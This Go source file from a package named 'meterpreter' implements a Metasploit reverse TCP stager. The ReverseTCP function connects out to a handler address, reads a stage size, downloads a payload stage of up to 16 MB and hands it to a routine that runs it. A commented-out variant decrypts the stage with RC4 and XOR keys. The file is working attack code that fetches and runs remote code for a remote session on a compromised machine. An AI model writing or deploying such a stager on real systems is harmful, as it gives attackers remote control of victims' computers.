package meterpreter

import (
	"encoding/binary"
	"io"
	"net"

	"github.com/pkg/errors"
)

// ReverseTCP is used to connect Metasploit handler.
func ReverseTCP(network, address, method string) error {
	rAddr, err := net.ResolveTCPAddr(network, address)
	if err != nil {
		return err
	}
	conn, err := net.DialTCP(network, nil, rAddr)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	// receive stage size
	stageSizeBuf := make([]byte, 4)
	_, err = io.ReadFull(conn, stageSizeBuf)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage size")
	}
	stageSize := int(binary.LittleEndian.Uint32(stageSizeBuf))
	if stageSize < 128 {
		return errors.New("stage is too small that < 128 Byte")
	}
	if stageSize > 16*1024*1024 {
		return errors.New("stage is too large that > 16 MB")
	}
	// receive stage
	stage := make([]byte, stageSize)
	_, err = io.ReadFull(conn, stage)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage")
	}
	return reverseTCP(conn, stage, method)
}

// ReverseTCPRC4 is used to connect Metasploit handler with RC4.
// func ReverseTCPRC4(network, address, method string, key []byte) error {
// 	rAddr, err := net.ResolveTCPAddr(network, address)
// 	if err != nil {
// 		return err
// 	}
// 	conn, err := net.DialTCP(network, nil, rAddr)
// 	if err != nil {
// 		return err
// 	}
// 	defer func() { _ = conn.Close() }()
// 	// calculate keys
// 	// metasploit/lib/msf/core/payload/windows/x64/rc4.rb
// 	hash := sha1.New()
// 	hash.Write(key)
// 	keys := hash.Sum(nil)
// 	xorKey := keys[:4]
// 	rc4Key := keys[4:16]
// 	// receive stage size
// 	stageSizeXORBuf := make([]byte, 4)
// 	_, err = io.ReadFull(conn, stageSizeXORBuf)
// 	if err != nil {
// 		return errors.Wrap(err, "failed to receive stage size")
// 	}
// 	stageSizeXOR := int(binary.LittleEndian.Uint32(stageSizeXORBuf))
// 	stageSize := stageSizeXOR ^ int(binary.LittleEndian.Uint32(xorKey))
// 	if stageSize < 128 {
// 		return errors.New("stage is too small that < 128 Byte")
// 	}
// 	if stageSize > 16*1024*1024 {
// 		return errors.New("stage is too large that > 16 MB")
// 	}
// 	// receive stage
// 	stageRC4 := make([]byte, stageSize)
// 	_, err = io.ReadFull(conn, stageRC4)
// 	if err != nil {
// 		return errors.Wrap(err, "failed to receive stage")
// 	}
// 	return reverseTCPRC4(conn, rc4Key, stageRC4, method)
// }
